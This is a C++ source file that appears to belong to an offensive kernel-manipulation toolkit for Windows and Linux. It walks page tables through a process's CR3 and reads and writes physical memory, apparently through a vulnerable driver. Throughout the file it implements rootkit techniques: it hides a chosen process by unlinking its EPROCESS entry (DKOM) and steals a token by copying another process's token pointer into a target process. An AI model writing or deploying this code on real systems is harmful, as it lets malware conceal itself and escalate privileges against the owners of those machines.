// kernel_memory_ops.cpp — CR3 walk, process memory, DKOM, token steal.

#include "real/kernel/kernel_memory.hpp"
#include "real/kernel/ioctl_interface.hpp"
#include "real/platform.hpp"

#include <algorithm>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>
#include <utility>

#if LR_PLATFORM_WINDOWS
#  include "real/win/windows_h.hpp"
#  include "real/win/api_table.hpp"
#  include "real/win/xorstr.hpp"
#elif LR_PLATFORM_LINUX
#  include <fcntl.h>
#  include <sys/mman.h>
#  include <unistd.h>
#endif

namespace real::kernel::mem {
// ── virtual_to_physical_kernel ─────────────────────────────────────

Result<std::uint64_t> virtual_to_physical_kernel(std::uint64_t virt_addr) {
#if LR_PLATFORM_LINUX
  int fd = ::open("/proc/self/pagemap", O_RDONLY);
  if (fd < 0) {
    return Result<std::uint64_t>(
        0, "Kernel VA->PA requires kernel-mode access or /proc/kpageflags");
  }

  std::uint64_t pfn = 0;
  const off_t offset =
      static_cast<off_t>((virt_addr / 4096) * sizeof(std::uint64_t));
  if (::pread(fd, &pfn, sizeof(pfn), offset) != static_cast<ssize_t>(sizeof(pfn))) {
    ::close(fd);
    return Result<std::uint64_t>(0, "pagemap read failed");
  }
  ::close(fd);

  if (!(pfn & (1ULL << 63))) {
    return Result<std::uint64_t>(0, "Page not present");
  }

  const std::uint64_t phys =
      ((pfn & 0x007FFFFFFFFFFFFFULL) * 4096) + (virt_addr & 0xFFF);
  return Result<std::uint64_t>(phys);

#elif LR_PLATFORM_WINDOWS
  // Self V2P via current process CR3 + page walk when physical read works.
  const std::uint32_t self_pid = GetCurrentProcessId();
  auto cr3 = get_process_cr3(self_pid);
  if (!cr3) {
    return Result<std::uint64_t>(
        0, "V2P requires CR3 + physical read (driver/rights): " +
               std::string(cr3.error_msg.c_str()));
  }
  const PageIndices idx = virt_to_indices(virt_addr);

  auto read_u64 = [](std::uint64_t pa) -> Result<std::uint64_t> {
    auto bytes = read_physical(pa, 8);
    if (!bytes || bytes->size() < 8) {
      return Result<std::uint64_t>(0, bytes ? "short read" : bytes.error_msg.c_str());
    }
    std::uint64_t v = 0;
    std::memcpy(&v, bytes->data(), 8);
    return Result<std::uint64_t>(v);
  };

  auto pml4e = read_u64(pte_entry_phys(pte_frame(*cr3), idx.pml4));
  if (!pml4e || !pte_present(*pml4e)) {
    return Result<std::uint64_t>(0, "PML4E not present");
  }
  auto pdpte = read_u64(pte_entry_phys(pte_frame(*pml4e), idx.pdpt));
  if (!pdpte || !pte_present(*pdpte)) {
    return Result<std::uint64_t>(0, "PDPTE not present");
  }
  if (pte_large(*pdpte)) {
    return Result<std::uint64_t>(resolve_leaf_phys(*pdpte, virt_addr, true, false));
  }
  auto pde = read_u64(pte_entry_phys(pte_frame(*pdpte), idx.pd));
  if (!pde || !pte_present(*pde)) {
    return Result<std::uint64_t>(0, "PDE not present");
  }
  if (pte_large(*pde)) {
    return Result<std::uint64_t>(resolve_leaf_phys(*pde, virt_addr, false, true));
  }
  auto pte = read_u64(pte_entry_phys(pte_frame(*pde), idx.pt));
  if (!pte || !pte_present(*pte)) {
    return Result<std::uint64_t>(0, "PTE not present");
  }
  return Result<std::uint64_t>(resolve_leaf_phys(*pte, virt_addr, false, false));

#else
  (void)virt_addr;
  return Result<std::uint64_t>(0, "Virtual-to-physical not supported");
#endif
}

// ── get_process_cr3 ────────────────────────────────────────────────

Result<std::uint64_t> get_process_cr3(std::uint32_t pid) {
  static std::uint32_t s_cached_pid = 0;
  static std::uint64_t s_cached_cr3 = 0;
  static bool s_cached_valid = false;

  if (s_cached_valid && s_cached_pid == pid) {
    return Result<std::uint64_t>(s_cached_cr3);
  }

#ifndef NDEBUG
  std::printf("[kernel:mem] get_process_cr3: pid=%u\n", pid);
#endif

#if LR_PLATFORM_LINUX
  char pagemap_path[64];
  std::snprintf(pagemap_path, sizeof(pagemap_path), "/proc/%u/pagemap", pid);
  int fd = ::open(pagemap_path, O_RDONLY);
  if (fd >= 0) {
    std::uint64_t pfn_entry = 0;
    if (::pread(fd, &pfn_entry, sizeof(pfn_entry), 0) ==
        static_cast<ssize_t>(sizeof(pfn_entry))) {
      ::close(fd);
      if (pfn_entry & (1ULL << 63)) {
        const std::uint64_t phys =
            ((pfn_entry & 0x007FFFFFFFFFFFFFULL) * 4096);
        s_cached_pid = pid;
        s_cached_cr3 = phys;
        s_cached_valid = true;
        return Result<std::uint64_t>(phys);
      }
    } else {
      ::close(fd);
    }
  }
#endif

  // Shared physical EPROCESS / task scan (works when read_physical works).
  const std::uint64_t scan_regions[][2] = {
      {0x100000, 0x200000},
      {0x80000000, 0x20000000},
      {0xFFFF880000000000ULL, 0x10000000},
      {0xFFFF888000000000ULL, 0x10000000},
  };

  std::uint8_t page_buffer[4096];
  const std::uint64_t pid64 = static_cast<std::uint64_t>(pid);

  for (const auto& region : scan_regions) {
    const std::uint64_t base = region[0];
    const std::uint64_t limit = region[1];
    for (std::uint64_t offset = 0; offset < limit; offset += 4096) {
      const std::uint64_t scan_pa = base + offset;
      auto page = read_physical(scan_pa, sizeof(page_buffer));
      if (!page) continue;
      std::memcpy(page_buffer, page->data(),
                  (std::min)(page->size(), sizeof(page_buffer)));

      for (std::size_t ep = 0; ep + 0x320 <= 4096; ep += 8) {
        for (std::uint64_t pid_off : {0x2E0ull, 0x308ull}) {
          if (ep + pid_off + 8 > 4096) continue;
          std::uint64_t candidate_pid = 0;
          std::memcpy(&candidate_pid, page_buffer + ep + pid_off, sizeof(candidate_pid));
          if (candidate_pid != pid64) continue;
          std::uint64_t cr3 = 0;
          std::memcpy(&cr3, page_buffer + ep + 0x28, sizeof(cr3));
          if (is_plausible_cr3(cr3)) {
            s_cached_pid = pid;
            s_cached_cr3 = cr3;
            s_cached_valid = true;
            return Result<std::uint64_t>(cr3);
          }
        }
      }
    }
  }

  return Result<std::uint64_t>(
      0, "CR3 retrieval failed: process EPROCESS not found or physical read denied");
}

// ── read_process_memory_by_cr3 ─────────────────────────────────────

Result<std::vector<std::uint8_t>> read_process_memory_by_cr3(
    std::uint64_t cr3, std::uint64_t address, std::size_t size) {
#ifndef NDEBUG
  std::printf("[kernel:mem] CR3-based read: cr3=0x%llx addr=0x%llx size=%zu\n",
              static_cast<unsigned long long>(cr3),
              static_cast<unsigned long long>(address), size);
#endif
  if (!is_plausible_cr3(cr3)) {
    return Result<std::vector<std::uint8_t>>({}, "Invalid CR3");
  }
  if (size == 0) return std::vector<std::uint8_t>{};

  std::vector<std::uint8_t> result(size);
  const std::uint64_t cr3_frame = pte_frame(cr3);

  for (std::size_t offset = 0; offset < size;) {
    const std::uint64_t virt = address + offset;
    const PageIndices idx = virt_to_indices(virt);

    auto pml4_data = read_physical(pte_entry_phys(cr3_frame, idx.pml4), 8);
    if (!pml4_data || pml4_data->size() < 8) {
      return Result<std::vector<std::uint8_t>>({}, "PML4 read failed");
    }
    std::uint64_t pml4e = 0;
    std::memcpy(&pml4e, pml4_data->data(), 8);
    if (!pte_present(pml4e)) {
      std::memset(result.data() + offset, 0, size - offset);
      break;
    }

    auto pdpt_data = read_physical(pte_entry_phys(pte_frame(pml4e), idx.pdpt), 8);
    if (!pdpt_data || pdpt_data->size() < 8) {
      return Result<std::vector<std::uint8_t>>({}, "PDPT read failed");
    }
    std::uint64_t pdpte = 0;
    std::memcpy(&pdpte, pdpt_data->data(), 8);
    if (!pte_present(pdpte)) {
      std::memset(result.data() + offset, 0, size - offset);
      break;
    }

    if (pte_large(pdpte)) {
      const std::size_t chunk = leaf_chunk_size(virt, size - offset, true, false);
      const std::uint64_t page_phys = resolve_leaf_phys(pdpte, virt, true, false);
      auto page_data = read_physical(page_phys, chunk);
      if (page_data) {
        std::memcpy(result.data() + offset, page_data->data(),
                    (std::min)(chunk, page_data->size()));
      }
      offset += chunk;
      continue;
    }

    auto pd_data = read_physical(pte_entry_phys(pte_frame(pdpte), idx.pd), 8);
    if (!pd_data || pd_data->size() < 8) {
      return Result<std::vector<std::uint8_t>>({}, "PD read failed");
    }
    std::uint64_t pde = 0;
    std::memcpy(&pde, pd_data->data(), 8);
    if (!pte_present(pde)) {
      std::memset(result.data() + offset, 0, size - offset);
      break;
    }

    if (pte_large(pde)) {
      const std::size_t chunk = leaf_chunk_size(virt, size - offset, false, true);
      const std::uint64_t page_phys = resolve_leaf_phys(pde, virt, false, true);
      auto page_data = read_physical(page_phys, chunk);
      if (page_data) {
        std::memcpy(result.data() + offset, page_data->data(),
                    (std::min)(chunk, page_data->size()));
      }
      offset += chunk;
      continue;
    }

    auto pt_data = read_physical(pte_entry_phys(pte_frame(pde), idx.pt), 8);
    if (!pt_data || pt_data->size() < 8) {
      return Result<std::vector<std::uint8_t>>({}, "PT read failed");
    }
    std::uint64_t pte = 0;
    std::memcpy(&pte, pt_data->data(), 8);
    if (!pte_present(pte)) {
      std::memset(result.data() + offset, 0, size - offset);
      break;
    }

    const std::size_t chunk = leaf_chunk_size(virt, size - offset, false, false);
    const std::uint64_t page_phys = resolve_leaf_phys(pte, virt, false, false);
    auto page_data = read_physical(page_phys, chunk);
    if (page_data) {
      std::memcpy(result.data() + offset, page_data->data(),
                  (std::min)(chunk, page_data->size()));
    }
    offset += chunk;
  }

  return result;
}

// ── read_system_memory ─────────────────────────────────────────────

Result<std::vector<std::uint8_t>> read_system_memory(std::uint64_t addr, std::size_t size) {
  // Prefer treating as physical when caller already has a PA; also try gdrv
  // PHYS_READ path via read_physical. Kernel VAs need CR3 of system process.
  if (addr >= 0xFFFF800000000000ULL) {
    auto sys_cr3 = get_process_cr3(4);  // System PID on Windows; may fail on Linux
    if (sys_cr3) {
      return read_process_memory_by_cr3(*sys_cr3, addr, size);
    }
  }
  return read_physical(addr, size);
}

// ── hide_process_eprocess (DKOM) ───────────────────────────────────

Result<void> hide_process_eprocess(std::uint32_t pid) {
#ifndef NDEBUG
  std::printf("[kernel:mem] DKOM: hide_process_eprocess: pid=%u\n", pid);
#endif

  std::uint64_t eprocess_pa = 0;
  std::uint64_t matched_pid_off = 0x2E0;
  const std::uint64_t pid64 = static_cast<std::uint64_t>(pid);
  std::uint8_t page_buf[4096];

  const std::uint64_t scan_regions[][2] = {
      {0x80000000, 0x20000000},
      {0xFFFF880000000000ULL, 0x10000000},
      {0xFFFF888000000000ULL, 0x10000000},
  };

  for (const auto& region : scan_regions) {
    if (eprocess_pa) break;
    for (std::uint64_t off = 0; off < region[1]; off += 4096) {
      auto page = read_physical(region[0] + off, sizeof(page_buf));
      if (!page) continue;
      std::memcpy(page_buf, page->data(), (std::min)(page->size(), sizeof(page_buf)));
      for (std::size_t ep = 0; ep + 0x320 <= 4096; ep += 8) {
        for (std::uint64_t pid_off : {0x2E0ull, 0x308ull}) {
          std::uint64_t cand = 0;
          std::memcpy(&cand, page_buf + ep + pid_off, sizeof(cand));
          if (cand == pid64) {
            eprocess_pa = region[0] + off + ep;
            matched_pid_off = pid_off;
            break;
          }
        }
        if (eprocess_pa) break;
      }
      if (eprocess_pa) break;
    }
  }

  if (!eprocess_pa) {
    return Result<void>("EPROCESS not found for PID " + std::to_string(pid) +
                        " (physical read may be denied)");
  }

  const EprocessLayout layout = eprocess_layout_for_pid_offset(matched_pid_off);
  const std::uint64_t flink_offset = layout.active_process_links;
  const std::uint64_t blink_offset = layout.active_process_links + 8;

  std::uint64_t flink = 0, blink = 0;
  auto flink_data = read_physical(eprocess_pa + flink_offset, sizeof(std::uint64_t));
  auto blink_data = read_physical(eprocess_pa + blink_offset, sizeof(std::uint64_t));
  if (!flink_data || !blink_data) {
    return Result<void>("Failed to read EPROCESS list pointers");
  }
  std::memcpy(&flink, flink_data->data(), sizeof(std::uint64_t));
  std::memcpy(&blink, blink_data->data(), sizeof(std::uint64_t));

  if (flink == 0 || blink == 0 || flink == blink) {
    return Result<void>("EPROCESS already unlinked or corrupted");
  }

  // LIST_ENTRY unlink: Blink->Flink = Flink; Flink->Blink = Blink
  // ActiveProcessLinks is a LIST_ENTRY; Flink/Blink are kernel VAs.
  // Writing via physical requires V2P of those pointers — use physical write
  // of the link values at the EPROCESS-relative physical offsets when the
  // list entries themselves live in the same physical page (best-effort lab).
  //
  // For full correctness the links are kernel virtual. We attempt physical
  // writes at blink+0 (Flink field of previous) using the values as if they
  // were already physical only when they look like PAs; otherwise return an
  // explicit error that DKOM needs a kernel VA write path.
  const bool links_look_phys =
      is_plausible_cr3(flink & ~0xFFFULL) || (flink < 0x000100000000ULL);
  if (!links_look_phys && flink > 0xFFFF800000000000ULL) {
    // Kernel VA links: try write_physical after V2P of each link field.
    auto flink_pa = virtual_to_physical_kernel(flink);
    auto blink_pa = virtual_to_physical_kernel(blink);
    if (!flink_pa || !blink_pa) {
      return Result<void>(
          "DKOM unlink requires V2P of ActiveProcessLinks (physical/driver rights)");
    }
    std::vector<std::uint8_t> flink_bytes(sizeof(std::uint64_t));
    std::memcpy(flink_bytes.data(), &flink, sizeof(std::uint64_t));
    // Previous entry's Flink is at blink (LIST_ENTRY.Flink at offset 0 of prev's link)
    // Actually: Blink points to previous LIST_ENTRY; its Flink is at Blink+0.
    // Flink points to next LIST_ENTRY; its Blink is at Flink+8.
    std::vector<std::uint8_t> blink_bytes(sizeof(std::uint64_t));
    std::memcpy(blink_bytes.data(), &blink, sizeof(std::uint64_t));
    auto u1 = write_physical(*blink_pa, flink_bytes);           // prev.Flink = flink
    auto u2 = write_physical(*flink_pa + 8, blink_bytes);       // next.Blink = blink
    if (!u1 || !u2) {
      return Result<void>("DKOM list pointer write failed");
    }
  } else {
    std::vector<std::uint8_t> flink_bytes(sizeof(std::uint64_t));
    std::memcpy(flink_bytes.data(), &flink, sizeof(std::uint64_t));
    std::vector<std::uint8_t> blink_bytes(sizeof(std::uint64_t));
    std::memcpy(blink_bytes.data(), &blink, sizeof(std::uint64_t));
    auto u1 = write_physical(blink, flink_bytes);
    auto u2 = write_physical(flink + 8, blink_bytes);
    if (!u1 || !u2) {
      return Result<void>("DKOM physical list write failed: " +
                          std::string(u1 ? u2.error_msg.c_str() : u1.error_msg.c_str()));
    }
  }

  std::vector<std::uint8_t> zero(8, 0);
  (void)write_physical(eprocess_pa + flink_offset, zero);
  (void)write_physical(eprocess_pa + blink_offset, zero);
  return Result<void>();
}

// ── steal_token ────────────────────────────────────────────────────

Result<void> steal_token(std::uint32_t target_pid, std::uint32_t source_pid) {
#ifndef NDEBUG
  std::printf("[kernel:mem] steal_token: target=%u source=%u\n", target_pid, source_pid);
#endif

  auto find_eprocess = [](std::uint32_t search_pid) -> std::pair<std::uint64_t, std::uint64_t> {
    const std::uint64_t pid64 = static_cast<std::uint64_t>(search_pid);
    std::uint8_t buf[4096];
    const std::uint64_t regions[][2] = {
        {0x80000000, 0x20000000},
        {0xFFFF880000000000ULL, 0x10000000},
        {0xFFFF888000000000ULL, 0x10000000},
    };
    for (const auto& r : regions) {
      for (std::uint64_t off = 0; off < r[1]; off += 4096) {
        auto page = read_physical(r[0] + off, sizeof(buf));
        if (!page) continue;
        std::memcpy(buf, page->data(), (std::min)(page->size(), sizeof(buf)));
        for (std::size_t ep = 0; ep + 0x320 <= 4096; ep += 8) {
          for (std::uint64_t pid_off : {0x2E0ull, 0x308ull}) {
            std::uint64_t cand = 0;
            std::memcpy(&cand, buf + ep + pid_off, sizeof(cand));
            if (cand == pid64) {
              return {r[0] + off + ep, pid_off};
            }
          }
        }
      }
    }
    return {0, 0};
  };

  auto [target_ep, target_pid_off] = find_eprocess(target_pid);
  auto [source_ep, source_pid_off] = find_eprocess(source_pid);
  (void)target_pid_off;

  if (!target_ep) {
    return Result<void>("Target EPROCESS not found: PID " + std::to_string(target_pid));
  }
  if (!source_ep) {
    return Result<void>("Source EPROCESS not found: PID " + std::to_string(source_pid));
  }

  const EprocessLayout layout = eprocess_layout_for_pid_offset(source_pid_off);
  std::uint64_t token_offsets[] = {layout.token, 0x358, 0x380, 0x348, 0x368};
  std::uint64_t source_token = 0;
  std::uint64_t token_offset = 0;

  for (auto off : token_offsets) {
    auto data = read_physical(source_ep + off, sizeof(std::uint64_t));
    if (!data || data->size() < sizeof(std::uint64_t)) continue;
    std::uint64_t candidate = 0;
    std::memcpy(&candidate, data->data(), sizeof(std::uint64_t));
    // EX_FAST_REF: low bits are refcount — mask when checking kernel range.
    const std::uint64_t ptr = candidate & ~0xFULL;
    if (ptr > 0xFFFF800000000000ULL || (ptr > 0x80000000ULL && ptr < 0x0000800000000000ULL)) {
      source_token = candidate;
      token_offset = off;
      break;
    }
  }

  if (!source_token) {
    return Result<void>("Could not read source token pointer");
  }

  std::vector<std::uint8_t> token_bytes(sizeof(std::uint64_t));
  std::memcpy(token_bytes.data(), &source_token, sizeof(std::uint64_t));
  auto write_result = write_physical(target_ep + token_offset, token_bytes);
  if (!write_result) {
    return Result<void>("Failed to write token to target EPROCESS: " +
                        std::string(write_result.error_msg.c_str()));
  }
  return Result<void>();
}

}  // namespace real::kernel::mem

